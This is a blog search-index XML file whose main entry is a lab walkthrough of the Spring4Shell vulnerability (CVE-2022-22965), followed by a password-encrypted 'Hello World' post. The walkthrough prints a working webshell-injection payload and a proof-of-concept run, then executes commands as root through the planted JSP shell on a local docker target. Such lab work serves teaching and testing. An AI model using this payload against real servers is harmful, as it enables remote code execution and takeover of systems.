<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2022-22965 - Build and Exploit</title>
      <link href="/blog/CVE/cve-2022-22965-build-and-attack/"/>
      <url>/blog/CVE/cve-2022-22965-build-and-attack/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="CVE-2022-22965"><a href="#CVE-2022-22965" class="headerlink" title="CVE-2022-22965"></a>CVE-2022-22965</h2><p>A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it.<br>Read more: <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-22965" title="link">https://nvd.nist.gov/vuln/detail/CVE-2022-22965</a></p><h2 id="Build-the-application"><a href="#Build-the-application" class="headerlink" title="Build the application"></a>Build the application</h2><p>This docker image contains a Spring Boot web application which is vulnerable to CVE-2022-22965.</p><p>A vulnerable configuration consists of:<br>JDK version 9+<br>Apache Tomcat for serving the application<br>Spring Framework versions 5.3.0 to 5.3.17 and 5.2.0 to 5.2.19 and below<br>application built as a WAR file</p><p>Pull the docker image</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ docker pull vulfocus/spring-core-rce-2022-03-29<br></code></pre></td></tr></table></figure><p>Then run the below command to deploy the web app</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ docker run --rm --name spring_rce -p 8080:8080 vulfocus/spring-core-rce-2022-03-29<br></code></pre></td></tr></table></figure><p>curl the localhost:8080 to confirm the application is running or not.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://localhost:8080 -v <br>*   Trying 127.0.0.1:8080...<br>* TCP_NODELAY <span class="hljs-built_in">set</span><br>* Connected to localhost (127.0.0.1) port 8080 (<span class="hljs-comment">#0)</span><br>&gt; GET / HTTP/1.1<br>&gt; Host: localhost:8080<br>&gt; User-Agent: curl/7.68.0<br>&gt; Accept: */*<br>&gt; <br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 200 <br>&lt; Content-Type: text/plain;charset=UTF-8<br>&lt; Content-Length: 2<br>&lt; Date: Thu, 07 Apr 2022 12:01:10 GMT<br>&lt; <br>* Connection <span class="hljs-comment">#0 to host localhost left intact</span><br>ok<br></code></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>Download the exploit script from github. i’m using this : <a href="https://github.com/BobTheShoplifter/Spring4Shell-POC" title="https://github.com/BobTheShoplifter/Spring4Shell-POC">https://github.com/BobTheShoplifter/Spring4Shell-POC</a></p><p>But there is lots of exploit script available for this vulnerability in github.</p><p>Here is the payload used in this python script</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        headers = &#123;<br>            <span class="hljs-string">&quot;suffix&quot;</span>: <span class="hljs-string">&quot;%&gt;//&quot;</span>,<br>            <span class="hljs-string">&quot;c1&quot;</span>: <span class="hljs-string">&quot;Runtime&quot;</span>,<br>            <span class="hljs-string">&quot;c2&quot;</span>: <span class="hljs-string">&quot;&lt;%&quot;</span>,<br>            <span class="hljs-string">&quot;DNT&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>            <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>        &#125;<br><br>        data = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&quot;</span><br><br>        <span class="hljs-keyword">try</span>:<br>            requests.post(self.url,<br>                          headers=headers,<br>                          data=data,<br>                          timeout=<span class="hljs-number">15</span>,<br>                          allow_redirects=<span class="hljs-literal">False</span>,<br>                          verify=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>run this command to inject the webshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"> $ git <span class="hljs-built_in">clone</span> https://github.com/BobTheShoplifter/Spring4Shell-POC.git<br>Cloning into <span class="hljs-string">&#x27;Spring4Shell-POC&#x27;</span>...<br>remote: Enumerating objects: 297, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (297/297), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (245/245), <span class="hljs-keyword">done</span>.<br>remote: Total 297 (delta 100), reused 109 (delta 27), pack-reused 0<br>Receiving objects: 100% (297/297), 16.45 MiB | 7.90 MiB/s, <span class="hljs-keyword">done</span>.<br>Resolving deltas: 100% (100/100), <span class="hljs-keyword">done</span>.<br>$ <span class="hljs-built_in">cd</span> Spring4Shell-POC/<br>$ <span class="hljs-built_in">chmod</span> +x poc.py <br>$ ./poc.py  --url http://localhost:8080/<br>Vulnerable，shell url: http://localhost:8080/tomcatwar.jsp?<span class="hljs-built_in">pwd</span>=j&amp;cmd=<span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p>the script successfully injected the webshell in the server.</p><p>just curl the url : <strong><a href="http://localhost:8080/tomcatwar.jsp?pwd=j&amp;cmd=id">http://localhost:8080/tomcatwar.jsp?pwd=j&amp;cmd=id</a></strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl <span class="hljs-string">&#x27;http://localhost:8080/tomcatwar.jsp?pwd=j&amp;cmd=id&#x27;</span> --output -<br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><br>//<br>- <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;j&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123; java.io.InputStream <span class="hljs-keyword">in</span> = -.getRuntime().<span class="hljs-built_in">exec</span>(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream(); int a = -1; byte[] b = new byte[2048]; <span class="hljs-keyword">while</span>((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; -<br>- <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;j&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123; java.io.InputStream <span class="hljs-keyword">in</span> = -.getRuntime().<span class="hljs-built_in">exec</span>(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream(); int a = -1; byte[] b = new byte[2048]; <span class="hljs-keyword">while</span>((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; -<br>- <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;j&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123; java.io.InputStream <span class="hljs-keyword">in</span> = -.getRuntime().<span class="hljs-built_in">exec</span>(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream(); int a = -1; byte[] b = new byte[2048]; <span class="hljs-keyword">while</span>((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; -<br>- <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;j&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123; java.io.InputStream <span class="hljs-keyword">in</span> = -.getRuntime().<span class="hljs-built_in">exec</span>(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream(); int a = -1; byte[] b = new byte[2048]; <span class="hljs-keyword">while</span>((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; -<br>- <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;j&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123; java.io.InputStream <span class="hljs-keyword">in</span> = -.getRuntime().<span class="hljs-built_in">exec</span>(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream(); int a = -1; byte[] b = new byte[2048]; <span class="hljs-keyword">while</span>((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; -<br></code></pre></td></tr></table></figure><p>Reference: <a href="https://github.com/itsecurityco/CVE-2022-22965" title="https://github.com/itsecurityco/CVE-2022-22965">https://github.com/itsecurityco/CVE-2022-22965</a></p>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spring-core </tag>
            
            <tag> java </tag>
            
            <tag> CVE-2022-22965 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/blog/hello-world/"/>
      <url>/blog/hello-world/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="19b5bec77531a0a19bc2396a4c3e54a080f2e8e435afe94814d464c61aa6ab49">763a5956788beae4faf402a8ec965d3d85971a1d3d4fa3443f9100b8b5e1d30ef2567112539c625299a102e28a13fdd7131a9bc6af2ad3cda001f50d729a090f271a4c46bf50c17e68cc41c1e026a44af5e85708bceafb5f983f05e8098245dd72bd638892b3ecd43dcc7c00c86dafba786ba8697671857fb8375e5548be2dc1956131b351f57cee504ecdd2a510982f349ad724cf1de2e6dd3be228fec79906481d3751ba9dffbf532de4488f9ad866dcb02008520b1db88c0d33ba2fadc5084c80db5b347b5e3a9e9a1cec5b32594c696c60de8afda8eadd8be155cfffd34704add86790a9a22a172d6b18aecb83ab6d4480b482b5d9afcc1fab8e891ec38a13212a02c18addf21846d37efaebef377a8648b8828de3a2052a46e0d9244227ef8be1cbf554dc38b5c4cb0ffe569d65eabd64e4614bd25f0270cbdcc3168eb2d17bc2883154fc8b4d540448d6fc839703c532b629fe20f0dc7a945e05eb09ade8b6f856d844334b623219536e1fbd7a8949f6f22e76587a77ab36c37f4532c7cad53638918558d7b22493a73d63579881235c71aefe4926569aa4dc9b76d7641612a932c7716d2e613f1a7c597b6750031cae987cc7f9c654220af1681504994642eb7ea0cb412acafee33de5126138973a011bfafeead7d9a4b530ced0d1f0bc5d890d881665e3ac66b362d136e0ddb2e3ea074ede81bd778b256dda335b662d2609ce764d2220f4477bf6a7d69d3ce8098862a0e015f8191231de6845cd041b550137297d887dedd5f53650f9ea008bcd1902715b0f287f27b12f2ff5c0d9345b63585a3dddb51e4bfd4a76b33557c70696347819fd056ee1805b956f71b88b6fd1e3747ee60bef6cf17e7e96794a233146b5cd8fcb96633bb167db493783926086d95b3be3aa7379227fe3b10745d7f7e34d4e42ce1f85ba9daa7ff80728e575dabb0ab20f9ed46ab12a83587788fe52f0ec45edda07730ba98d60fc456e7561ce9916e3ab9b38d795ee144617c2e38e173a9622ee3970d3ff3f84dfd1d18732627dbbf0fa09b05503725a201396dc937d398587de4f108141e763e037c09cf6aa0bbe4133cd88982a2b0ddcb31b509186923129cf8776320bf0e3b082f30f60acc1938d27631af64d58081eef88e9212f282941137ac15dffe8ea8856dd4d6a6403866b3ac5d61717770f8fed4a293015a137d947129fd605af948e8c9f81909526a8230f0c2da0b04e1f96feb9879abf6fccd47c0533fe4d6178523bba83a1c892080aaf2030b8f8db75b47684583adb292d4054c695efe0848c526958704f57f4b0c42815b824e43d1738c62edd9490a2ce0ca15c68965d6c228252585815f35a871b798bcfab6cb0cef5c18cb72c1d4d21cbf13f3df8684817ea70283cdda2aa77780c054e1097852a951d19e63071c0b22c2f224b6a82ecb065a4fb3ac8c62abea49ba53ecb5e0b3be430b9baaba567692dfe57506af764ba971c3ec9380739493a89c0c70bdd674c2985f3947dcbfb39d0d28f48b65dd231a6cae58e635d51653f7d6f081a427c6d6220c896b9a1a0bc75151a51a2d38493c201d9b1bdf2dac92f65dac71b24ddda1445295355b2e0705b1ad389efe8329618a7b43e2e55ec8b365af1e0256aeb49ca5ecfbcfa00e0bfe896f2db935d68e84f2a023576f6e4dc5d3279e62241c713ac300e68f03b98326012df2a1116e8e53069d7a947a46b8da3b093a0b911d2d81f0145f6c2eb2b9ce915e0f535552cfbe2c8ccce7b077586b415cc182124ac22f23f44fea3e70d286c013f824474da5ccd73266ac4a2c05358174bef166e585376d450fe2ad39741f33c8aa102a10735eb3fc23b3a0827c7acdebb076c800d78c7faefe4777741e41e6f5a5e32fc878ae50d42d45cbc8d7d1c41fb21826bccb6bac7465393b80cdf6e4a8351087f3a085893f14cc37b60dcd55011aa5655118b63e545fbdf263de337d716c5b1464438fccc5bd0a193642fc479b7e0b001ff9f0a40decd79f5d7384d5e04b607948bc5b136b982b1ef574453b93b74f81d6bb71a99aa95b8fac86528890155f687491e1b7a072921806030834b4bb057caf3de8970155f59d4a6e5df3a0a9bcd1e972e49864e0da23165edb2fbe032b625721e56e85504c6b3fb40112f6a785601f5d82d3762af07d71736fb02293e6596f7cf8c456dadadc11c821575e7beb4cbcc1588f0fb6fb8340780cad357d4594c5093357996341e8ba0469fa3f75b0697e790b8e532e4948aa1a03efba4754eb0696d722020db410623ed947a4b8ed1c75432c30ab414689efda81e0951c261d12d8d046d84af95843ff52a90ffae92c63f916a1c2293f23bd60118a279811c5338d2010d10e6764851df07bd92553c394c14d96c166ddf5caaacf42dca14d4bfedfb157971927bc363ca55a5510d746f724b140ae785e0a3434befa151dc979072ad700bd21fb794927f5d655df0b8e3d311a2e46ed9918f763a02598f077370250582fdab11228cae8166b411e67eae3dc011459d3b6462557129b95117c5fc8fc92936cad364e66daed83d3a9b855d4f550073c8d74f9e724d04422d3b263d08c5f3ba72c7d5553eabaecebbd625668617628ad3b2b2b25fa5b5d7d4a3dad38c3c8f6c3f5006b72334df803a13a86531f9feadcf02a73919363accefdab626abbce6e573c5f5246ec4ac4b3bbbc38c60982264497ee902e5f86cb61b43180db327bf1dc881dd77adbabcbe54d6b09673ca86295edee3bc31d373a31b1b9aa47d683bc9f5435babca7a9602211d2d464425d4c1463785f773edf5f99c9402ad3f4d0328bfb9ecd43bf538d8bd8aeb1c93fdeb7184a17698e9c78f4fdda3e14126c1b3271ecbf55a6d5762d8d07279636a4b4f72219f3ad33941d218c0c611b195cb5ed69bf630f4b2ccdb314c296056780896667e2123884063b2b6cffc310212b0040380607374f0ea6520aa1e9da529bd58301b3d9b7b4200aac19886606266261ecf116765a2e5a80458bccdb49e67a4db7512921e2221e1af283ada945afd2b4340b2f64f99f41bc66a5cd5aa0c4d40354b02ae61480d7fd2a55ae82d97ca89be6fe2ab5f8bc73e26e9d7ffc60d3377f482de72dbfaee07414d2908b6ac1049d1f06e4745e428de29c54ece5b93f090c1cfb9359022cd4562077f82124a7195386df9a1b0832f1679dddfc23e9ff890f0c6e4a5d175d31de0201deb6130eaa7d572fb9533802338d553a846ade8a05ae740ff812b89cd3ed7261cc23b47f012c2205d8aca444bf757a0526510f57c258fd594</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">You must enter the password to read.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/blog/lib/hbe.js"></script><link href="/blog/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
